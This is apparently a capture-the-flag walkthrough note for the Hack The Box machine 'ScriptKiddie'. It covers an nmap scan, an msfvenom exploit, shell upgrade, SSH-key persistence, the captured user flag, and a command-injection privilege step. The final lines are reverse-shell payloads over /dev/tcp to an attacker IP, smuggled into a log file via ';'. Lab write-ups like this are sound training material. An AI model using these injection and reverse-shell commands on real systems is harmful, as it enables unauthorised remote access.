# ScriptKiddie 

## Easy | 10.10.10.226



### nmap scan
┌──(f0ur3y3s㉿f0ur3y3skali)-[~]
└─$ nmap -sCV 10.10.10.226                                                                                    130 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-25 08:45 EDT
Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 19.88% done; ETC: 08:46 (0:00:16 remaining)
Nmap scan report for 10.10.10.226
Host is up (0.36s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
|_http-title: k1d'5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.70 seconds
                                                                 

### followup actions

tried dirbuster, nothing

all tools seem to work 

venom? msfvenom?

found msfvenom vulnerability
https://www.exploit-db.com/exploits/49491

use exploit, set LHOST and LPORT to 10.10.14.86 and 9876

spawn netcat listener with nc -lvnp 9876

upload file to website

upgrade shell with      python3 -c 'import pty; pty.spawn("/bin/bash")'

found user.txt 007f8d2bbc13b0676185d93a836319e6

user is kid

tried to add ssh keys to authorized keys

echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2yyBD3MnCURqU9jrydT2QzkfNPvCalb8/mLabzWSyi8QGRaA6eZNpjM+hqfZRagPqMwrw8wxxs1yMVXQvfpAVFGwnpDTAPF2BzE/XmyTciEJihGpKKK659N7qULpOFvmmRNpmm6SDErqgR8O6nsKhInzJOB6N2KTS9dyzfi7Q98lSm/tWrXdyjAMbc8r83F0cniGMyO/8rQvmPVa0f2WDZvExmAZLDiqOIMfeBRFd9ivWTtHZnGNXshfRKJWnLVNmzVEUpJ3RLSNBrNsJJEIJwdPBNE0Rm3Q+EtPMoluGZ9UBCkGWDC6ymSBRSdKKyuMWP4PnAlFacCBwQUZLkMfzjtux7avaT+tAAxQkHAJeXHrJxUwiT4grkudzAA21oyoTX7MDgIlSyY8dNZCebzc+8PgUcMDT47hJFtBms40YgXp2aiKofcYxBmXSZ5jfillsm/pWBR3+efeaOOxWm/vzXC2DQuZeP2RzN4ntFRBJCX5vqWZTaVsJSpa+nUSHRy8= f0ur3y3s@f0ur3y3skali" >> ~/.ssh/authorized_keys

ssh kid@10.10.10.226 -i htb


kid@scriptkiddie:/home/pwn$ cat scan                                                                                
cat scanlosers.sh                                                                                                   
#!/bin/bash                                                                                                         
                                                                                                                    
log=/home/kid/logs/hackers                                                                                          
                                                                                                                    
cd /home/pwn/                                                                                                       
cat $log | cut -d' ' -f3- | sort -u | while read ip; do                                                             
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &                                        
done                                                                                                                
                                                                                                                    
if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi   






echo ";/bin/bash -l > /dev/tcp/10.10.14.86/4321 0<&1 2>&1" >> hackers




echo ";/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.86/9876 0>&1' #" >> hackers
